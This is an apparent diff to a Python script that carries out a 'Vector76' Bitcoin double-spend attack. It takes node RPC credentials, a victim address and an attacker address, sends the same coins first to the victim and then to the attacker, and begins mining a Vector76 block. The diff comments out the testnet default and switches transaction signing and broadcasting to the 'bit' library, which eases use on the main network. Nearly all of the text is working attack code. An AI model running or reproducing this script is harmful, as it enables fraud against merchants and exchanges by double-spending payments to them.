@@ -7,11 +7,11 @@ import subprocess
 from hashlib import sha256
 from bitcoincli import Bitcoin
 from bitcoinaddress import Wallet
+from bit import Key
 #from bitcoin_tools.core.transaction import TX
 from datetime import datetime
 
 parser = argparse.ArgumentParser(description="How To Use vector76")
-
 parser.add_argument("node_host",
                     help="Blockchain Node Host",
                     type=str)
@@ -39,10 +39,10 @@ parser.add_argument("amount_of_coins",
 parser.add_argument("prev_deposit_TXID",
                     help="Last deposit TXID of first attacker address",
                     type=str)
-parser.add_argument("--network",
-                    help="mainnet or testnet. (Default = testnet)",
-                    type=str,
-                    default="testnet")
+#parser.add_argument("--network",
+#                    help="mainnet or testnet. (Default = testnet)",
+#                    type=str,
+#                    default="testnet")
 
 def to_satoshi(btc_amount):
     satoshi = 0.00000001
@@ -138,54 +138,37 @@ victim_address   = args.victim_address
 attacker_address = args.attacker_address
 amount_BTC = args.amount_of_coins#float(sys.argv[9])
 prev_txid  = args.prev_deposit_TXID
-network = args.network
+#network = args.network
 
-if (network != "mainnet") and (network != "testnet"):
-    network = "testnet"
-
-print(f"[+] {network} Mode.")
-if network == "mainnet":
-    network = "btc"
+#if (network != "mainnet") and (network != "testnet"):
+#    network = "testnet"
+#
+#print(f"[+] {network} Mode.")
+#if network == "mainnet":
 
 print("Connecting Node...")
 rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
 
 print("--------------------")
-amount_satoshi = to_satoshi(amount_BTC)
-print(amount_satoshi)
-fee_satoshi = 1500
-bitcoin.set_network(network)
-print("Create T1 rawtx And sign")
-send_amount = amount_satoshi - fee_satoshi
-tx_victim = [{"value": send_amount, "address": victim_address}]
-tx_victim = bitcoin.mktx(tx_victim)
-print(tx_victim)
-tx_victim = bitcoin.sign(tx_victim, key)
-print()
-print(tx_victim)
-
-print("Create T2 rawtx And sign")
-tx_attacker = [{"value": send_amount, "address": attacker_address}]
-tx_attacker = bitcoin.mktx(tx_attacker)
-print(tx_attacker)
-tx_attacker = bitcoin.sign(tx_attacker, key)
-print()
-print(tx_attacker)
-print("[+] READY...")
-print(f"Network : {network}")
-print(f"Send Amount (Satoshi) : {amount_satoshi - fee_satoshi}")
-print(f"Mining Fee  (Satoshi) : {fee_satoshi}")
+print(f"Send Amount (BTC)     : {amount_BTC}")
 print(f"Victim   Address      : {victim_address}")
 print(f"Attacker Address      : {attacker_address}")
-input(" --- Press the enter key to continue the Vector76 attack. --- ")
+print("--------------------")
+
+print("[+] READY...")
+input(" --- Press the enter key to continue the Vector76 attack... --- ")
+#print(amount_satoshi)
+#fee_satoshi = 1500
 print("push T1")
-broadcast_transaction(tx_victim)
-print("T1 Pushed.")
+key = Key(key)
+#send_amount = amount_satoshi - fee_satoshi
+tx_victim = [(victim_address, amount_BTC, "btc")]
+key.send(tx_victim)
 
 print("push T2")
-broadcast_transaction(tx_attacker)
-print("T2 Pushed.")
-
+tx_attacker = [(attacker_address, amount_BTC, "btc")]
+key.send(tx_attacker)
+print()
 print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
 print("Mining Vector76 Block...")
